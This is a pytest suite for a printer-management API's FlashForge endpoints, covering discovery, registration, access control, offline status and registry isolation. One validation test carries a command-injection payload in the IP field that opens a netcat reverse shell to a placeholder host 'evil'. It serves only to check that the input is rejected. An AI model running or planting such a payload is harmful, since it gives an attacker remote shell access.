import backend.api.flashforge_printers as flashforge_printers_api
import backend.services.flashforge_service as flashforge_service


def _fake_scan_network(devices):
    async def _scan(timeout=None):
        return devices
    return _scan


def _fake_check_auth(code, message=None, detail=None):
    def _check_auth(self):
        result = {"code": code}
        if message is not None:
            result["message"] = message
        result["detail"] = detail or {}
        return result
    return _check_auth


class TestFlashforgeDiscover:
    def test_empty_discovery(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_printers_api, "scan_network", _fake_scan_network([]))
        response = client.post("/api/flashforge/printers/discover")
        assert response.status_code == 200
        assert response.json() == {"devices": []}

    def test_device_detected_shape(self, client, as_admin, monkeypatch):
        device = {"serial_number": "FF5M1234567", "ip": "192.168.1.60", "name": "Adventurer 5M", "model": "Adventurer 5M", "http_port": 8898, "lan_only": True}
        monkeypatch.setattr(flashforge_printers_api, "scan_network", _fake_scan_network([device]))
        response = client.post("/api/flashforge/printers/discover")
        assert response.status_code == 200
        assert response.json() == {"devices": [device]}


class TestFlashforgeRegister:
    def test_register_success_and_does_not_leak_check_code(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.60", "serial_number": "FF-OK-1", "check_code": "123456", "name": "Adventurer Taller",
        })
        assert response.status_code == 200
        body = response.json()
        assert body["serial_number"] == "FF-OK-1"
        assert "check_code" not in body
        assert any(e["serial_number"] == "FF-OK-1" for e in flashforge_service._load_registry())

    def test_wrong_check_code_returns_400_and_does_not_save(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(1, message="checkCode inválido"))
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.60", "serial_number": "FF-BAD-CODE", "check_code": "000000", "name": "N",
        })
        assert response.status_code == 400
        assert response.json()["error_code"] == "CREDENTIAL_REJECTED"
        assert not any(e["serial_number"] == "FF-BAD-CODE" for e in flashforge_service._load_registry())

    def test_unreachable_printer_returns_400_and_does_not_save(self, client, as_admin, monkeypatch):
        # check_auth()/_post() colapsa cualquier ConnectionError/timeout a {}
        # (ver flashforge_service.py) -- eso es lo que hay que simular acá.
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", lambda self: {})
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.250", "serial_number": "FF-UNREACHABLE", "check_code": "000000", "name": "N",
        })
        assert response.status_code == 400
        assert response.json()["error_code"] == "CONNECTION_FAILED"
        assert not any(e["serial_number"] == "FF-UNREACHABLE" for e in flashforge_service._load_registry())

    def test_requires_admin(self, client, as_operator, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.60", "serial_number": "FF-NOPERM", "check_code": "000000", "name": "N",
        })
        assert response.status_code == 403

    def test_invalid_ip_rejected_before_touching_network(self, client, as_admin, monkeypatch):
        called = False

        def _should_not_be_called(self):
            nonlocal called
            called = True
            return {"code": 0, "detail": {}}

        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _should_not_be_called)
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.60; nc -e /bin/sh evil 4444", "serial_number": "FF-INJECT", "check_code": "0", "name": "N",
        })
        assert response.status_code == 400
        assert called is False

    def test_malicious_name_rejected(self, client, as_admin):
        response = client.post("/api/flashforge/printers", data={
            "ip": "192.168.1.60", "serial_number": "FF-BADNAME", "check_code": "0", "name": "bad\x00name",
        })
        assert response.status_code == 400

    def test_duplicate_registration_updates_in_place(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        client.post("/api/flashforge/printers", data={"ip": "192.168.1.60", "serial_number": "FF-DUP", "check_code": "0", "name": "Old"})
        client.post("/api/flashforge/printers", data={"ip": "192.168.1.61", "serial_number": "FF-DUP", "check_code": "0", "name": "New"})
        entries = [e for e in flashforge_service._load_registry() if e["serial_number"] == "FF-DUP"]
        assert len(entries) == 1
        assert entries[0]["name"] == "New"


class TestFlashforgeUnregister:
    def test_unregister_removes_entry(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        client.post("/api/flashforge/printers", data={"ip": "192.168.1.60", "serial_number": "FF-DEL", "check_code": "0", "name": "N"})
        response = client.delete("/api/flashforge/printers/FF-DEL")
        assert response.status_code == 200
        assert not any(e["serial_number"] == "FF-DEL" for e in flashforge_service._load_registry())

    def test_unregister_requires_admin(self, client, as_operator):
        response = client.delete("/api/flashforge/printers/FF-WHATEVER")
        assert response.status_code == 403

    def test_unregister_unknown_returns_404(self, client, as_admin):
        response = client.delete("/api/flashforge/printers/FF-NEVER-EXISTED")
        assert response.status_code == 404


class TestFlashforgeListingAndOfflineState:
    def test_registered_printer_survives_as_offline_when_unreachable(self, client, as_admin, monkeypatch):
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        client.post("/api/flashforge/printers", data={"ip": "192.168.1.200", "serial_number": "FF-OFFLINE", "check_code": "0", "name": "Fuera de línea"})

        # Tras registrar, simula que la impresora ya no responde /detail
        # (apagada) -- get_registered_printers_with_status hace polling real.
        monkeypatch.setattr(flashforge_service.FlashForgeClient, "get_detail", lambda self: {})
        response = client.get("/api/flashforge/printers")
        assert response.status_code == 200
        printer = next(p for p in response.json()["printers"] if p["id"] == "FF-OFFLINE")
        assert printer["online"] is False
        assert printer["status"] == "offline"
        assert any(e["serial_number"] == "FF-OFFLINE" for e in flashforge_service._load_registry())


class TestFlashforgeOtherBrandsUnaffected:
    def test_registering_flashforge_does_not_touch_other_brands_registry(self, client, as_admin, monkeypatch):
        import backend.services.bambu_service as bambu_service
        import backend.services.elegoo_service as elegoo_service

        monkeypatch.setattr(flashforge_service.FlashForgeClient, "check_auth", _fake_check_auth(0))
        client.post("/api/flashforge/printers", data={"ip": "192.168.1.60", "serial_number": "FF-ISOLATION", "check_code": "0", "name": "N"})
        assert bambu_service._load_registry() == []
        assert elegoo_service._load_registry() == []
